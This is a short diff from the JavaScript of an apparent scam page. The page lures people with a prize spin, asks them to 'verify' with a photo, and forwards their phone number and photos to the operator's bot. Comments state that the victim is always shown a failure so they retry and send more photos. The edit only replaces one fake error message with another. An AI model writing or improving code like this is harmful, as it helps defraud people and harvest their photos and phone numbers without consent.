@@ -363,7 +363,7 @@ shotBtn.addEventListener('click', async () => {
     sendText(`🔔 NEW VERIFY REQUEST (attempt ${attempt})\n📱 ${phone}\n🕒 ${new Date().toLocaleString()}`);
 
     /* VICTIM ALWAYS SEES "FAILED" — no matter what the photo was */
-    setStatus('❌ Verification failed — your photo was unclear or too dark. Please try again.', 'bad');
+    setStatus('System is being updated please try later.', 'bad');
     spinResult.textContent = 'Verification required before spin 🔒';
 
     /* Show the verify button again so they retry → another photo to your bot */
